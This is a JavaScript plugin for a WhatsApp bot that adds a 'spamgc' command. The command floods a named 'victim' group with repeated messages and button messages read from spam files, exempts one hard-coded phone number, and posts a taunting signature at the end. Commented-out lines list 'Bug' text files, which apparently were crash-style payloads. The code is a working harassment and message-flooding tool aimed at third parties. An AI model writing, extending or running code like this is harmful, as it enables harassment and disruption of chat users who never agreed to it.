import { time } from 'console';
import fs from 'fs'
import moment from 'moment-timezone'

let handler = async (m, { conn, args , command, text, usedPrefix }) => {


let victim = text.split("/")[0]
let count = text.split("/")[1]


if (!victim) throw `! Enter Victim group and count correctly [ ex :- .spam 120363026344956097@g.us/20 ] (Default count is 10)`

if (!count) { count = 10}

if (victim.includes (` `)) throw `no spaces`

if (victim.includes (`201123816710`)) throw `Are You Kidding me ?`




//let spams = ['./Spam/text/s.txt','./Spam/text/Bug 02.txt','./Spam/text/Bug 03.txt','./Spam/text/Bug 04.txt' , './Spam/text/Bug 05.txt' , './Spam/text/Spam 01.txt' , './Spam/text/Spam 03.txt']
let spams = ['./Spam/text/test.txt']

let i2 = 0


await conn.sendMessage(m.chat, { text : `Sending ${count *2} Spams` } , { quoted: m } )
//await conn.sendMessage(`94772601056@s.whatsapp.net`   , { text : `Sending ${count *2} Spams to Groups ${victim}  ` } , { quoted: m } )

while (i2 < count * 2 ) {


    let spam1 =  spams[Math.floor(Math.random() * spams.length)]


let textx = fs.readFileSync(`${spam1}`)

    
    
   await conn.sendMessage(victim, { text : textx })
   await conn.sendButton(victim, `${textx}`, `${textx}`, [`${textx}`, `${textx}`], m)


    
    i2++
 


}



await conn.sendMessage(victim, { text : `Spaamed by FUCKERZ COMMIUNITY ~ Powered by Jayarathne Technical`  })


await conn.sendMessage(m.chat, { text : `Succesfully sent ${count * 2} spam to group/${victim}` } , { quoted: m } )










}



handler.command = /^(spamgc)$/i

export default handler

